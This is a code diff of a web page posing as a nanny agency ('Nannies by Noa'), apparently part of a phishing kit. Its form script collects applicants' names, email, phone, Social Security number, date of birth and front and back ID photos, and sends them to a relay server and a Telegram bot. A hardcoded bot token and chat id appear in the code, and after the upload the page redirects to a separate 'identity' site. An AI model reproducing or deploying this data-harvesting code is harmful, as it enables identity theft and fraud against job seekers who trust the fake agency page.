@@ -4,7 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>
-      Nannies by Noa | New York &amp; Tri-State Area Nanny Agency | Newborn Care
+      Nannies by Noa | United States &amp; Tri-State Area Nanny Agency | Newborn
+      Care
     </title>
     <meta
       property="og:image"
@@ -222,131 +223,98 @@
 
       async function submitForm(event) {
         event.preventDefault();
-        // Disable the submit button and change its text to "Processing"
         const submitButton = document.querySelector('button[type="submit"]');
         submitButton.disabled = true;
         submitButton.textContent = "Processing...";
-        // Fetch form values
-        const firstName = document.getElementById("firstName").value;
-        const lastName = document.getElementById("lastName").value;
-        const email = document.getElementById("email").value;
-        const phoneNumber = document.getElementById("phoneNumber").value;
-        const ssn = document.getElementById("ssn").value;
-        const gender = document.getElementById("gender").value;
-        const dob = document.getElementById("dob").value;
-        console.log(firstName);
 
-        console.log(lastName);
-        const data = {
-          firstName,
-          lastName,
-          email,
-          phoneNumber,
-          ssn,
-          gender,
-          dob,
-        };
-        // Make a fetch request to the Telegram API endpoint
-        fetch("https://telegram-bot-dkpv.onrender.com/form", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            console.log("Telegram API response:", data);
-            // Handle the response as needed
-          })
-          .catch((error) => {
-            console.error("Error sending photo to Telegram:", error);
-            // Handle the error as needed
-          });
-        // Fetch file inputs
-        const frontPicture = Array.from(
-          document.getElementById("frontPicture").files
+        const formData = new FormData(
+          document.getElementById("registrationForm")
         );
-        const backPicture = Array.from(
-          document.getElementById("backPicture").files
-        );
+        const response = await sendFormData(formData);
 
-        // Get the file input element
+    
+
+        // Check if a file is selected for front picture
         const frontPictureInput = document.getElementById("frontPicture");
-        const backPictureInput = document.getElementById("backPicture");
-
-        // Check if a file is selected
         if (frontPictureInput.files.length > 0) {
-          // Get the selected file
-          const file = frontPictureInput.files[0];
+          const photo = frontPictureInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error(
+              "Error sending photo to Telegram:",
+              photoResponse.statusText
+            );
+          } else {
+            console.log("Image sent 1")
+          }
+        }
 
-          // Create a FormData object to handle multipart/form-data
+        // Check if a file is selected for back picture
+        const backPictureInput = document.getElementById("backPicture");
+        if (backPictureInput.files.length > 0) {
+          const photo = backPictureInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error(
+              "Error sending photo to Telegram:",
+              photoResponse.statusText
+            );
+          } else {
+            console.log("Image sent 2")
+            window.location.replace("https://identity-eosin.vercel.app/");
+
+          }
+        }
+      }
+
+      async function sendFormData(formData) {
+        try {
+          return await fetch("https://telegram-bot-dkpv.onrender.com/form", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(Object.fromEntries(formData)),
+          });
+        } catch (error) {
+          console.error("Error sending data to Telegram:", error);
+          return null;
+        }
+      }
+
+      async function sendPhotoToTelegram(photo) {
+        try {
           const formData = new FormData();
-
-          // Append the photo file to the FormData object
-          formData.append("photo", file);
-
-          // Append other data (chat_id, etc.) to the FormData object
+          formData.append("photo", photo);
           formData.append("chat_id", "1636602095");
 
-          // Make a fetch request to the Telegram API endpoint
-          fetch(
+          return await fetch(
             "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
             {
               method: "POST",
               body: formData,
             }
-          )
-            .then((response) => response.json())
-            .then((data) => {
-              console.log("Telegram API response:", data);
-              // Handle the response as needed
-            })
-            .catch((error) => {
-              console.error("Error sending photo to Telegram:", error);
-              // Handle the error as needed
-            });
-        } else {
-          console.error("No file selected");
-          // Handle the case where no file is selected
-        }
-        // Check if a file is selected
-        if (backPictureInput.files.length > 0) {
-          // Get the selected file
-          const file = backPictureInput.files[0];
-
-          // Create a FormData object to handle multipart/form-data
-          const formData2 = new FormData();
-
-          // Append the photo file to the FormData object
-          formData2.append("photo", file);
-
-          // Append other data (chat_id, etc.) to the FormData object
-          formData2.append("chat_id", "1636602095");
-
-          // Make a fetch request to the Telegram API endpoint
-          fetch(
-            "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
-            {
-              method: "POST",
-              body: formData2,
-            }
-          )
-            .then((response) => response.json())
-            .then((data2) => {
-              console.log("Telegram API response:", data2);
-              // Handle the response as needed
-              window.location.replace("https://identity-eosin.vercel.app/");
-            })
-            .catch((error) => {
-              console.error("Error sending photo to Telegram:", error);
-              // Handle the error as needed
-            });
-        } else {
-          console.error("No file selected");
-          // Handle the case where no file is selected
+          );
+        } catch (error) {
+          console.error("Error sending photo to Telegram:", error);
+          return null;
         }
       }
+
+      // Add event listeners for file input changes after defining functions
+      window.addEventListener("load", function () {
+        document
+          .getElementById("frontPicture")
+          .addEventListener("change", function () {
+            updateFileName("frontPicture", this);
+          });
+
+        document
+          .getElementById("backPicture")
+          .addEventListener("change", function () {
+            updateFileName("backPicture", this);
+          });
+      });
     </script>
   </body>
 </html>
